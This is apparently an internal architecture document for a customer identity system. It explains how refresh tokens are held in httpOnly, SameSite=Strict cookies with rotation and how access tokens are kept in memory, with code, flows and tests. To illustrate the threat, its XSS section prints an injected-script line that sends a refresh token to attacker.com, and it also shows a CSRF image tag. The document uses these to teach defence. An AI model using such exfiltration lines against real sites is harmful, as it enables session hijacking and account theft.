# CIAM Token Architecture

## Overview

This document describes the token management architecture for the CIAM (Customer Identity and Access Management) system, focusing on the secure handling of refresh tokens via httpOnly cookies and access tokens in memory.

## Architecture Principles

### Security-First Design
- **XSS Protection**: Refresh tokens stored in httpOnly cookies are inaccessible to JavaScript
- **Cookie Security**: All cookies use Secure, SameSite=Strict, and httpOnly flags
- **Token Separation**: Access tokens (short-lived) separate from refresh tokens (long-lived)
- **Automatic Rotation**: Refresh tokens automatically rotated on each refresh operation

### OpenAPI v3 Compliance
The implementation fully complies with OpenAPI specification at:
`/ciam-backend/changes/10072025/001/openapi_v3.yaml`

Key compliance points:
- Refresh tokens ONLY in Set-Cookie headers (never in response bodies)
- 30-day cookie expiry (Max-Age=2592000 seconds)
- Standard cookie security attributes

## Token Types

### Access Token (Short-Lived)
- **Purpose**: Authorize API requests
- **Lifetime**: 15 minutes (900 seconds)
- **Storage**: In-memory (`globalThis.__CIAM_ACCESS_TOKEN__`)
- **Transport**: Response body JSON + memory storage
- **Security**: Can be accessed by JavaScript, hence short lifetime

### ID Token (Short-Lived)
- **Purpose**: User identity information (JWT claims)
- **Lifetime**: 15 minutes (900 seconds)
- **Storage**: Extracted and parsed, not stored
- **Transport**: Response body JSON
- **Content**: User claims (sub, email, roles, etc.)

### Refresh Token (Long-Lived)
- **Purpose**: Obtain new access/id tokens without re-authentication
- **Lifetime**: 30 days (2,592,000 seconds)
- **Storage**: httpOnly cookie (browser-managed)
- **Transport**: Set-Cookie header ONLY
- **Security**: Inaccessible to JavaScript (XSS protection)

## Cookie Configuration

### Standard Cookie Attributes

All refresh token cookies use these security attributes:

```typescript
res.cookie('refresh_token', refreshToken, {
  httpOnly: true,                          // Prevents JavaScript access
  secure: process.env.NODE_ENV === 'production',  // HTTPS only in production
  maxAge: 30 * 24 * 60 * 60 * 1000,       // 30 days in milliseconds
  sameSite: 'strict',                      // CSRF protection
  path: '/'                                // Available to all paths
});
```

### Cookie Attributes Explained

| Attribute | Value | Purpose |
|-----------|-------|---------|
| `httpOnly` | `true` | Prevents JavaScript access, protects against XSS |
| `secure` | `true` (production) | Requires HTTPS, prevents man-in-the-middle attacks |
| `maxAge` | 2,592,000,000 ms (30 days) | Cookie expiration time |
| `sameSite` | `strict` | Prevents CSRF attacks, cookie only sent to same site |
| `path` | `/` | Cookie available to all application paths |

## Token Flow Diagrams

### 1. Initial Login Flow

```
User -> Browser -> CIAM Backend
                    |
                    | 1. Validate credentials
                    | 2. Generate tokens (access, id, refresh)
                    | 3. Set refresh_token cookie
                    | 4. Return access_token + id_token in response body
                    |
Browser <- CIAM Backend
  |
  | Store access_token in memory (globalThis.__CIAM_ACCESS_TOKEN__)
  | Parse id_token for user info
  | Browser automatically manages refresh_token cookie
  |
User receives authenticated session
```

### 2. API Request Flow

```
User Action -> Browser
                |
                | 1. Retrieve access_token from memory
                | 2. Add Authorization: Bearer {access_token}
                | 3. Add credentials: 'include' for automatic cookie handling
                |
            API Request -> CIAM Backend
                            |
                            | Validate access_token
                            |
            Response <- CIAM Backend
                |
            Browser
```

### 3. Token Refresh Flow

```
Access Token Expiring/Expired
    |
Browser -> POST /auth/refresh
    |      credentials: 'include' (sends refresh_token cookie)
    |
CIAM Backend
    |
    | 1. Read refresh_token from cookie
    | 2. Validate refresh_token
    | 3. Generate new access_token + id_token
    | 4. Generate new refresh_token (rotation)
    | 5. Set new refresh_token cookie
    | 6. Return new access_token + id_token in response body
    |
Browser <- Response
    |
    | Update access_token in memory
    | Browser automatically updates refresh_token cookie
    |
Session Extended
```

### 4. MFA Login Flow with Tokens

```
User -> Login (username/password)
    |
    v
MFA Required Response (no tokens yet)
    |
    v
User -> Complete MFA (OTP or Push)
    |
    v
MFA Verify Success
    |
    | Backend generates all 3 tokens
    | Set refresh_token cookie (30 days)
    | Return access_token + id_token in response body
    |
    v
Browser stores access_token in memory
Browser automatically manages refresh_token cookie
```

## Backend Implementation

### Endpoints that Set refresh_token Cookie

All of these endpoints set the refresh_token cookie on successful authentication:

1. **POST /auth/login** (Success: 201)
   - Direct login without MFA/eSign

2. **POST /auth/mfa/verify** (Success with tokens)
   - After successful MFA verification

3. **POST /esign/accept** (Success with tokens)
   - After eSign acceptance

4. **POST /device/bind** (Success with tokens)
   - After device binding

5. **POST /auth/refresh** (Success: 200)
   - Token refresh (rotates refresh_token)

### Response Body Structure (OpenAPI Compliant)

**Example: POST /auth/login (Success)**
```json
{
  "response_type_code": "SUCCESS",
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "id_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 900,
  "context_id": "ctx_123",
  "device_bound": true
}
```

**Note**: `refresh_token` is NOT in response body. It's in Set-Cookie header:
```
Set-Cookie: refresh_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=2592000
```

## Frontend Implementation

### AuthService.ts Configuration

#### Automatic Cookie Handling
```typescript
private async apiCall<T>(
  endpoint: string,
  options: RequestInit = {}
): Promise<T> {
  const url = `${this.config.baseURL}${endpoint}`;
  const controller = new AbortController();

  const response = await fetch(url, {
    ...options,
    signal: controller.signal,
    credentials: 'include',  // Critical: Sends cookies automatically
  });

  return await response.json();
}
```

The `credentials: 'include'` setting ensures:
- Browser sends refresh_token cookie with every request
- Backend can read refresh_token from cookie
- Browser automatically updates refresh_token cookie from Set-Cookie headers

#### Access Token Storage
```typescript
private setStoredAccessToken(token: string): void {
  if (this.config.storageType === 'session') {
    sessionStorage.setItem(this.STORAGE_KEYS.ACCESS_TOKEN, token);
  } else {
    // In-memory storage (default, more secure)
    (globalThis as any).__CIAM_ACCESS_TOKEN__ = token;
  }
}

private getStoredAccessToken(): string | null {
  if (this.config.storageType === 'session') {
    return sessionStorage.getItem(this.STORAGE_KEYS.ACCESS_TOKEN);
  } else {
    // In-memory storage
    return (globalThis as any).__CIAM_ACCESS_TOKEN__ || null;
  }
}
```

**Default: In-Memory Storage**
- More secure (cleared on page refresh/tab close)
- Suitable for sensitive applications
- Requires users to re-authenticate after page refresh

**Optional: sessionStorage**
- Persists across page refreshes within same tab
- Better user experience for less sensitive applications
- Configure via `storageType: 'session'` in CiamProvider

### Token Refresh Implementation

```typescript
async refreshToken(): Promise<TokenRefreshResponse> {
  const response = await this.apiCall<TokenRefreshResponse>('/auth/refresh', {
    method: 'POST',
  });

  // Update stored access token
  if (response.access_token) {
    this.setStoredAccessToken(response.access_token);
  }

  return response;
}
```

**Key Points**:
- No need to read refresh_token (browser sends cookie automatically)
- No need to store new refresh_token (browser updates cookie automatically)
- Only update access_token in memory

## Security Benefits

### XSS Attack Mitigation

**Without httpOnly Cookies (Vulnerable)**:
```javascript
// Attacker's injected script could steal tokens
const refreshToken = localStorage.getItem('refresh_token');
fetch('https://attacker.com/steal?token=' + refreshToken);
```

**With httpOnly Cookies (Protected)**:
```javascript
// Attacker's script CANNOT access the cookie
document.cookie; // Does NOT include httpOnly cookies
// Browser automatically manages cookie, JavaScript cannot read it
```

### CSRF Attack Mitigation

The `sameSite: 'strict'` attribute prevents CSRF attacks:

**Attack Scenario**:
```html
<!-- Attacker's website -->
<img src="https://victim-ciam.com/auth/sensitive-action" />
```

**Protection**:
- Cookie NOT sent because request originates from different site
- `sameSite: 'strict'` blocks cross-site cookie transmission

### Token Rotation Benefits

Every `/auth/refresh` call generates a new refresh_token:

1. **Limited Window**: If refresh_token is stolen, it's only valid until next refresh
2. **Automatic Invalidation**: Old refresh_tokens automatically invalidated
3. **Breach Detection**: Unexpected refresh_token usage can indicate compromise

## Migration from v1 (Response Body) to v3 (Cookie-Only)

### Backend Changes

**Before (v1 - Non-compliant)**:
```typescript
return res.status(201).json({
  response_type_code: 'SUCCESS',
  access_token: accessToken,
  id_token: idToken,
  refresh_token: refreshToken,  // ❌ Security risk
  token_type: 'Bearer',
  expires_in: 900,
  context_id: context_id
});
```

**After (v3 - OpenAPI Compliant)**:
```typescript
// Set refresh_token cookie (30 days)
res.cookie('refresh_token', refreshToken, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  maxAge: 30 * 24 * 60 * 60 * 1000,  // 30 days
  sameSite: 'strict'
});

// Return response without refresh_token
return res.status(201).json({
  response_type_code: 'SUCCESS',
  access_token: accessToken,
  id_token: idToken,
  token_type: 'Bearer',
  expires_in: 900,
  context_id: context_id
});
```

### Frontend Changes

**No Breaking Changes Required!**

The frontend was already cookie-compliant:
- Never read refresh_token from response bodies
- Always used `credentials: 'include'` for automatic cookie handling
- Only stored/used access_token from responses

**Changes Made**:
1. Removed optional `refresh_token?: string` fields from TypeScript interfaces
2. Updated test mocks to not include refresh_token
3. Updated documentation to reflect cookie-only approach

## Testing & Validation

### Backend Validation

Test that all token-generating endpoints set the cookie correctly:

```bash
# Test login endpoint
curl -i -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser",
    "password": "password123",
    "drs_action_token": "test_token",
    "app_id": "test",
    "app_version": "1.0"
  }'

# Expected response headers:
# Set-Cookie: refresh_token=eyJhbG...; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=2592000

# Expected response body:
# {
#   "response_type_code": "SUCCESS",
#   "access_token": "...",
#   "id_token": "...",
#   // NO refresh_token field
# }
```

### Frontend Validation

**Browser DevTools Verification**:

1. **Application Tab → Cookies**
   - Verify `refresh_token` cookie exists
   - Check attributes: HttpOnly ✓, Secure ✓, SameSite=Strict ✓
   - Check Max-Age: 2592000 (30 days)

2. **Network Tab**
   - Login request: Check Set-Cookie header in response
   - API requests: Verify Cookie header includes refresh_token
   - Refresh request: Verify new Set-Cookie with rotated token

3. **Console**
   - `document.cookie` should NOT show refresh_token (httpOnly protection)
   - `globalThis.__CIAM_ACCESS_TOKEN__` should show access token

## Production Checklist

- [✅] All endpoints set refresh_token cookie (not response body)
- [✅] Cookie max-age is 2,592,000 seconds (30 days)
- [✅] httpOnly attribute is true
- [✅] secure attribute is true in production
- [✅] sameSite attribute is 'strict'
- [✅] Frontend uses credentials: 'include'
- [✅] TypeScript interfaces don't include refresh_token in response types
- [✅] Tests updated to not expect refresh_token in responses
- [✅] Documentation updated to reflect cookie-only approach

## References

- **OpenAPI Specification**: `/ciam-backend/changes/10072025/001/openapi_v3.yaml`
- **Backend Implementation**: `/ciam-backend/src/controllers/auth-simple.ts`
- **Frontend Service**: `/ciam-ui/src/services/AuthService.ts`
- **Migration Guide**: `/ciam-ui/V2_MIGRATION_SUMMARY.md`
- **MDN httpOnly Cookies**: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies
- **OWASP Secure Cookie Attribute**: https://owasp.org/www-community/controls/SecureCookieAttribute

## Conclusion

This architecture provides enterprise-grade security for token management:

- **XSS Protection**: httpOnly cookies prevent JavaScript access
- **CSRF Protection**: SameSite=Strict prevents cross-site attacks
- **Token Rotation**: Automatic refresh_token rotation limits breach window
- **OpenAPI Compliance**: Full compliance with API specification
- **Production Ready**: Security best practices applied throughout

The cookie-based approach is the industry standard for refresh token management and provides superior security compared to JavaScript-accessible storage mechanisms.
